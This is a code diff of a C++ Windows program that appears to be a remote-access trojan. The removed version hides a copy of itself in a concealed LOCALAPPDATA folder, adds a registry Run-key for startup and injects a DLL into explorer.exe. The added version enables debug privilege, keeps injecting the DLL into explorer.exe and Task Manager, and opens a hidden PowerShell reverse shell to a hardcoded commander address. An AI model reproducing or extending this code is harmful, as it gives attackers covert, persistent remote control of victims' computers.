@@ -9,206 +9,236 @@
 #include <wchar.h>
 #include <Shlwapi.h>
 #include <TlHelp32.h>
-
-using namespace std;
-
-// t.me/afterpeice
+#include <Psapi.h>
+#include <Userenv.h>
 
 #pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib, "Shlwapi.lib")
+#pragma comment(lib, "Psapi.lib")
+#pragma comment(lib, "Userenv.lib")
 
-std::string commander = "172.29.226.172";
-std::string street = "0009";
+std::string commander = "1.1.1.1";
+std::string street = "1119";
 
-void AddToStartup(const std::string& fullPath) {
-    HKEY hKey;
-    const char* czStartName = "$9dollarnine";
+#define print(format, ...) fprintf (stderr, format, __VA_ARGS__)
 
-    if (RegOpenKeyExA(HKEY_CURRENT_USER,
-        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-
-        RegSetValueExA(hKey, czStartName, 0, REG_SZ, (BYTE*)fullPath.c_str(), fullPath.length());
-        RegCloseKey(hKey);
+bool IsElevated() {
+    BOOL fRet = FALSE;
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        TOKEN_ELEVATION Elevation;
+        DWORD cbSize = sizeof(TOKEN_ELEVATION);
+        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
+            fRet = Elevation.TokenIsElevated;
+        }
     }
+    if (hToken) {
+        CloseHandle(hToken);
+    }
+    return fRet;
 }
 
-bool CopyToHiddenFolder(const std::string& sourcePath, const std::string& targetPath) {
-    if (!CopyFileA(sourcePath.c_str(), targetPath.c_str(), FALSE)) {
+bool EnableDebugPrivilege() {
+    HANDLE hToken;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
         return false;
-    }
-    SetFileAttributesA(targetPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
+
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
+        return false;
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
+        return false;
+
+    CloseHandle(hToken);
     return true;
 }
 
-void InitAndCopyFiles() {
-    char originalPath[MAX_PATH];
-    GetModuleFileNameA(NULL, originalPath, MAX_PATH);
+DWORD GetProcId(const wchar_t* pn, unsigned short int fi = 0b1101) {
+    DWORD procId = 0;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
-    char appDataPath[MAX_PATH];
-    if (GetEnvironmentVariableA("LOCALAPPDATA", appDataPath, MAX_PATH) == 0) {
-        return;
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32W pE;
+        pE.dwSize = sizeof(pE);
+
+        if (Process32FirstW(hSnap, &pE)) {
+            if (!pE.th32ProcessID)
+                Process32NextW(hSnap, &pE);
+            do {
+                if (fi == 0b10100111001)
+                    wcout << pE.szExeFile << L"\t\t" << pE.th32ProcessID << endl;
+                if (!_wcsicmp(pE.szExeFile, pn)) {
+                    procId = pE.th32ProcessID;
+                    print("Process Found: %lu\n", pE.th32ProcessID);
+                    break;
+                }
+            } while (Process32NextW(hSnap, &pE));
+        }
     }
-
-    // Create target directory
-    std::string targetDir = std::string(appDataPath) + "\\$9TaskHostW";
-    if (!CreateDirectoryA(targetDir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
-        return;
-    }
-    SetFileAttributesA(targetDir.c_str(), FILE_ATTRIBUTE_HIDDEN);
-
-    // Get source directory
-    char sourceDir[MAX_PATH];
-    strcpy_s(sourceDir, originalPath);
-    PathRemoveFileSpecA(sourceDir);
-
-    // Copy executable
-    std::string targetExePath = targetDir + "\\$9dollarnine.exe";
-    if (!CopyToHiddenFolder(originalPath, targetExePath)) {
-        return;
-    }
-
-    // Copy DLL if it exists
-    std::string sourceDllPath = std::string(sourceDir) + "\\do.dll";
-    if (GetFileAttributesA(sourceDllPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
-        std::string targetDllPath = targetDir + "\\do.dll";
-        CopyToHiddenFolder(sourceDllPath, targetDllPath);
-    }
-
-    AddToStartup(targetExePath);
+    CloseHandle(hSnap);
+    return procId;
 }
 
-DWORD GetExplorerPID() {
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(PROCESSENTRY32);
+BOOL InjectDLL(DWORD procID, const char* dllPath) {
+    BOOL WPM = 0;
 
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap == INVALID_HANDLE_VALUE) {
-        return 0;
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procID);
+    if (hProc == INVALID_HANDLE_VALUE) {
+        return -1;
     }
-
-    if (Process32First(hSnap, &pe)) {
-        do {
-            if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
-                CloseHandle(hSnap);
-                return pe.th32ProcessID;
-            }
-        } while (Process32Next(hSnap, &pe));
+    void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    WPM = WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);
+    if (!WPM) {
+        CloseHandle(hProc);
+        return -1;
     }
-
-    CloseHandle(hSnap);
+    print("DLL Injected Successfully at %p\n", loc);
+    HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);
+    if (!hThread) {
+        VirtualFreeEx(hProc, loc, strlen(dllPath) + 1, MEM_RELEASE);
+        CloseHandle(hProc);
+        return -1;
+    }
+    print("Thread Created Successfully with ID %lu\n", GetThreadId(hThread));
+    CloseHandle(hProc);
+    VirtualFreeEx(hProc, loc, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hThread);
     return 0;
 }
 
-bool InjectDLL(const std::string& dllPath) {
-    if (GetFileAttributesA(dllPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
-        return false;
-    }
-
-    DWORD pid = GetExplorerPID();
-    if (pid == 0) {
-        return false;
-    }
-
-    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
-        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
-    if (hProcess == NULL) {
-        return false;
-    }
-
-    LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, dllPath.size() + 1,
-        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (pDllPath == NULL) {
-        CloseHandle(hProcess);
-        return false;
-    }
-
-    if (!WriteProcessMemory(hProcess, pDllPath, dllPath.c_str(), dllPath.size() + 1, NULL)) {
-        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return false;
-    }
-
-    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
-    if (pLoadLibrary == NULL) {
-        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return false;
-    }
-
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
-        (LPTHREAD_START_ROUTINE)pLoadLibrary, pDllPath, 0, NULL);
-    if (hThread == NULL) {
-        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return false;
-    }
-
-    WaitForSingleObject(hThread, INFINITE);
-
-    DWORD exitCode = 0;
-    GetExitCodeThread(hThread, &exitCode);
-
-    VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
-    CloseHandle(hThread);
-    CloseHandle(hProcess);
-
-    return (exitCode != 0);
-}
-
-int main(int argc, char* argv[])
-{
-    InitAndCopyFiles();
-    FreeConsole();
-
-    char appDataPath[MAX_PATH];
-    if (GetEnvironmentVariableA("LOCALAPPDATA", appDataPath, MAX_PATH) == 0) {
-        return -1;
-    }
-
-    std::string dllPath = std::string(appDataPath) + "\\$9TaskHostW\\do.dll";
-
-    if (!InjectDLL(dllPath)) {
-        return -1;
-    }
-
-    WSADATA wsaData;
-    SOCKET ConnectSocket;
-    int  programme = WSAStartup(MAKEWORD(2, 2), &wsaData);
-    struct addrinfo* out = NULL, * ptr = NULL, hints;
-    memset(&hints, 0, sizeof(hints));
-    hints.ai_family = AF_UNSPEC;
-    hints.ai_socktype = SOCK_STREAM;
-    hints.ai_protocol = IPPROTO_TCP;
+DWORD WINAPI InjectionMonitor(LPVOID lpParam) {
+    std::string* dllPath = (std::string*)lpParam;
+    EnableDebugPrivilege();
 
     while (true) {
-        getaddrinfo(commander.c_str(), street.c_str(), &hints, &out);
-        ptr = out;
-        ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);
+        DWORD explorerPID = GetProcId(L"explorer.exe");
+        if (explorerPID != 0) {
+            if (InjectDLL(explorerPID, dllPath->c_str()) != 0) {
+                Sleep(1000);
+                continue;
+            }
+        }
 
-        if (connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
+        DWORD taskmgrPID = GetProcId(L"Taskmgr.exe");
+        if (taskmgrPID != 0) {
+            InjectDLL(taskmgrPID, dllPath->c_str());
+        }
+        Sleep(100);
+    }
+    return 0;
+}
+
+void CreatePowerShellSession(SOCKET ConnectSocket) {
+    STARTUPINFOEXA si;
+    PROCESS_INFORMATION pi;
+    SIZE_T attributeSize;
+    ZeroMemory(&si, sizeof(STARTUPINFOEXA));
+    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+
+    // Set up handles for redirection
+    si.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
+    si.StartupInfo.hStdInput = (HANDLE)ConnectSocket;
+    si.StartupInfo.hStdOutput = (HANDLE)ConnectSocket;
+    si.StartupInfo.hStdError = (HANDLE)ConnectSocket;
+
+    // Get current process token to duplicate
+    HANDLE hProcessToken = NULL;
+    HANDLE hPrimaryToken = NULL;
+
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY, &hProcessToken)) {
+        // Duplicate the token to create a primary token
+        DuplicateTokenEx(hProcessToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken);
+        CloseHandle(hProcessToken);
+    }
+
+    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = NULL;
+    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
+    lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
+    InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &attributeSize);
+
+    if (hPrimaryToken) {
+        UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_TOKEN, &hPrimaryToken, sizeof(HANDLE), NULL, NULL);
+    }
+
+    si.lpAttributeList = lpAttributeList;
+
+    // Create the process
+    CreateProcessA(NULL,
+        (LPSTR)"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoExit -NoLogo -WindowStyle Hidden",
+        NULL, NULL, TRUE,
+        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
+        NULL, NULL, &si.StartupInfo, &pi);
+
+    if (hPrimaryToken) {
+        CloseHandle(hPrimaryToken);
+    }
+    if (lpAttributeList) {
+        DeleteProcThreadAttributeList(lpAttributeList);
+        HeapFree(GetProcessHeap(), 0, lpAttributeList);
+    }
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+}
+
+int main() {
+    FreeConsole();
+
+    char currentPath[MAX_PATH];
+    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
+    PathRemoveFileSpecA(currentPath);
+    std::string dllPath = std::string(currentPath) + "\\do.dll";
+
+    if (GetFileAttributesA(dllPath.c_str()) == INVALID_FILE_ATTRIBUTES)
+        return -1;
+
+    HANDLE hThread = CreateThread(NULL, 0, InjectionMonitor, &dllPath, 0, NULL);
+    if (!hThread)
+        return -1;
+
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+        return -1;
+
+    while (true) {
+        struct addrinfo* out = NULL, hints;
+        memset(&hints, 0, sizeof(hints));
+        hints.ai_family = AF_UNSPEC;
+        hints.ai_socktype = SOCK_STREAM;
+        hints.ai_protocol = IPPROTO_TCP;
+
+        if (getaddrinfo(commander.c_str(), street.c_str(), &hints, &out) != 0) {
             Sleep(5000);
             continue;
         }
 
-        STARTUPINFO star;
-        PROCESS_INFORMATION pr;
-        ZeroMemory(&star, sizeof(star));
-        star.cb = sizeof(star);
-        ZeroMemory(&pr, sizeof(pr));
-        star.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-        star.wShowWindow = SW_HIDE;
-        star.hStdInput = (HANDLE)ConnectSocket;
-        star.hStdOutput = (HANDLE)ConnectSocket;
-        star.hStdError = (HANDLE)ConnectSocket;
-        TCHAR call[] = TEXT("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
-        CreateProcess(NULL, call, NULL, NULL, TRUE, 0, NULL, NULL, &star, &pr);
-        WaitForSingleObject(pr.hProcess, INFINITE);
-        CloseHandle(pr.hProcess);
-        CloseHandle(pr.hThread);
+        SOCKET ConnectSocket = WSASocket(out->ai_family, out->ai_socktype, out->ai_protocol, NULL, NULL, NULL);
+        if (ConnectSocket == INVALID_SOCKET) {
+            freeaddrinfo(out);
+            Sleep(5000);
+            continue;
+        }
 
+        if (connect(ConnectSocket, out->ai_addr, (int)out->ai_addrlen) == SOCKET_ERROR) {
+            closesocket(ConnectSocket);
+            freeaddrinfo(out);
+            Sleep(5000);
+            continue;
+        }
+
+        CreatePowerShellSession(ConnectSocket);
         closesocket(ConnectSocket);
+        freeaddrinfo(out);
     }
 
     WSACleanup();
+    return 0;
 }
